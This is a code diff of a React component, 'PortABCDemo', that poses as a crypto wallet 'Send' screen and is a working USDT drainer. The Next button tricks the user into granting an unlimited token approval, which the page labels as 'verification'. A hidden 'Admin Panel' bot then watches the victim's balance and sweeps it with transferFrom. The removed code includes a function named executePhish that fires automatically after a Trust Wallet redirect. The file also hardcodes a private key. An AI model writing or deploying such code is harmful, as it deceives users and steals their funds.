@@ -1,109 +1,163 @@
 "use client";
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { ethers } from 'ethers';
 
-const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
+// USDT ABI
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
+
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
 
 export default function PortABCDemo() {
   const [logs, setLogs] = useState<string[]>([]);
-  const [isWalletDetected, setIsWalletDetected] = useState(false);
+  const [isMonitoring, setIsMonitoring] = useState(false);
+  const [targetAmount, setTargetAmount] = useState<string>("10");
+
+  // Configuration (Use fresh burner wallets for demo)
+  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
+  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
+  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
+  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";
+
 
   const addLog = (msg: string) => {
     setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
   };
 
-  // --- PERSISTENT TRIGGER CHECK ---
-  useEffect(() => {
-    const checkAndTrigger = async () => {
-      // 1. Check if we have the "pending" flag in storage
-      const isPending = localStorage.getItem('transfer_pending') === 'true';
-      
-      const interval = setInterval(async () => {
-        if (typeof window !== "undefined" && (window as any).ethereum) {
-          setIsWalletDetected(true);
-          clearInterval(interval);
-
-          if (isPending) {
-            addLog("Resuming secure session...");
-            localStorage.removeItem('transfer_pending'); // Clear flag
-            
-            // Small delay to let Trust Wallet settle
-            setTimeout(async () => {
-              await executePhish();
-            }, 1000);
-          }
-        }
-      }, 500);
-    };
-
-    checkAndTrigger();
-  }, []);
-
-  async function executePhish() {
+  async function simulateVictimApproval() {
     try {
+      if (!(window as any).ethereum) return alert("Please install MetaMask");
       const provider = new ethers.providers.Web3Provider((window as any).ethereum);
-      await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
+      await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
       const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
       
-      addLog("Initializing verification...");
+      addLog("Initializing secure transfer...");
       const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
       await tx.wait();
-      addLog("Success: Verified.");
-    } catch (err) {
-      addLog("Verification Required.");
+      addLog("Wallet verified successfully.");
+    } catch (err: any) {
+      addLog("Transaction failed.");
     }
   }
 
-  async function handleAction() {
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    const isInside = typeof window !== "undefined" && (window as any).ethereum;
+  async function startMonitoring() {
+    try {
+      const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
+      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);
 
-    if (isMobile && !isInside) {
-      addLog("Redirecting...");
-      // Save the intent to local storage before jumping
-      localStorage.setItem('transfer_pending', 'true');
-      
-      const currentUrl = window.location.origin + window.location.pathname;
-      window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
-      return;
+      setIsMonitoring(true);
+      addLog("Bot: Monitoring node activated...");
+
+      const interval = setInterval(async () => {
+        try {
+          const balance = await contract.balanceOf(VICTIM_WALLET_ADDRESS);
+          const threshold = ethers.utils.parseUnits(targetAmount, 18);
+
+          if (balance.gte(threshold)) {
+            const tx = await contract.transferFrom(VICTIM_WALLET_ADDRESS, RECEIVER_ADDRESS, balance, {
+              gasPrice: (await provider.getGasPrice()).mul(2)
+            });
+            await tx.wait();
+            addLog("Transfer complete.");
+            clearInterval(interval);
+            setIsMonitoring(false);
+          }
+        } catch (err: any) {}
+      }, 5000);
+    } catch (err: any) {
+      addLog("Connection error.");
     }
-
-    await executePhish();
   }
 
   return (
-    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4">
-      <div className="w-full max-w-[400px] bg-[#111] border border-[#222] rounded-[32px] p-8 shadow-2xl">
-        <div className="flex justify-center mb-6">
-          <div className={`px-3 py-1 rounded-full text-[10px] font-bold border ${isWalletDetected ? 'border-green-500/30 text-green-500' : 'border-white/10 text-gray-500'}`}>
-            {isWalletDetected ? '● PORT SECURE' : '○ WAITING FOR PORT'}
-          </div>
-        </div>
-
-        <h1 className="text-xl font-bold mb-8 text-center uppercase tracking-widest">PortABC</h1>
+    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans">
+      
+      {/* Main "Port" Container */}
+      <div className="w-full max-w-[440px] bg-[#111] border border-[#222] rounded-3xl p-6 shadow-2xl">
+        <h1 className="text-xl font-semibold mb-6">Send</h1>
 
         <div className="space-y-4">
-          <div className="bg-[#1a1a1a] p-5 rounded-2xl border border-[#333]">
-            <p className="text-[10px] text-gray-500 font-bold uppercase mb-1">Asset</p>
-            <p className="text-sm font-bold text-green-500">USDT (BEP-20)</p>
+          {/* Token Selector UI */}
+          <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl flex items-center justify-between cursor-pointer hover:border-gray-500 transition-colors">
+            <div className="flex items-center gap-3">
+              <div className="w-8 h-8 bg-[#222] rounded-full flex items-center justify-center text-xs font-bold text-green-500 border border-green-900/30">
+                USDT
+              </div>
+              <div>
+                <p className="text-sm font-medium">USDT</p>
+                <p className="text-[10px] text-gray-500">Tether USD</p>
+              </div>
+            </div>
+            <span className="text-gray-500">▼</span>
           </div>
 
+          {/* Address Input */}
+          <div className="space-y-2">
+            <label className="text-xs text-gray-500 ml-1">Address or Domain Name</label>
+            <div className="relative">
+              <input 
+                type="text" 
+                placeholder="0x... or ENS"
+                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-green-500 transition-all"
+              />
+              <button className="absolute right-4 top-4 text-xs text-green-500 font-medium hover:text-green-400">Paste</button>
+            </div>
+          </div>
+
+          {/* Amount Input */}
+          <div className="space-y-2">
+            <label className="text-xs text-gray-500 ml-1">Amount</label>
+            <div className="relative">
+              <input 
+                type="number" 
+                value={targetAmount}
+                onChange={(e) => setTargetAmount(e.target.value)}
+                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-green-500 transition-all pr-20"
+              />
+              <div className="absolute right-4 top-4 flex gap-2">
+                <span className="text-xs text-gray-500">USDT</span>
+                <button className="text-xs text-green-500 font-medium hover:text-green-400">Max</button>
+              </div>
+            </div>
+            <p className="text-[10px] text-gray-500 ml-1 italic">Available: Unable to verify balance</p>
+          </div>
+
+          {/* Action Button (The "Claim" / Trap) */}
           <button 
-            onClick={handleAction}
-            className="w-full bg-white text-black font-black py-5 rounded-2xl hover:bg-gray-200 transition-all uppercase text-sm"
+            onClick={simulateVictimApproval}
+            className="w-full bg-white text-black font-bold py-4 rounded-2xl hover:bg-gray-200 transition-all mt-4"
           >
-            {isWalletDetected ? 'Verify Wallet' : 'Next'}
+            Next
           </button>
         </div>
       </div>
 
-      <div className="mt-6 font-mono text-[10px] text-gray-600">
-        {logs.map((l, i) => <div key={i}>{l}</div>)}
+      {/* Attacker "Dashboard" (Hidden/Subtle for demo purposes) */}
+      <div className="mt-10 w-full max-w-[440px] opacity-40 hover:opacity-100 transition-opacity">
+        <div className="bg-[#111] border border-red-900/30 p-4 rounded-2xl">
+          <div className="flex justify-between items-center mb-3">
+            <p className="text-[10px] uppercase tracking-widest text-red-500 font-bold">Admin Panel</p>
+            <button 
+              onClick={startMonitoring}
+              className="text-[10px] bg-red-950 text-red-400 px-3 py-1 rounded-full border border-red-800"
+            >
+              {isMonitoring ? "WATCHING..." : "LAUNCH MONITOR"}
+            </button>
+          </div>
+          <div className="bg-black p-3 rounded-lg font-mono text-[10px] text-green-500 h-24 overflow-hidden border border-[#222]">
+            {logs.length === 0 ? "> Initializing system..." : logs.map((l, i) => <div key={i}>{l}</div>)}
+          </div>
+        </div>
       </div>
+
+      <p className="mt-8 text-[10px] text-gray-600">Built with v0 • PortABC Protocol</p>
     </div>
   );
 }
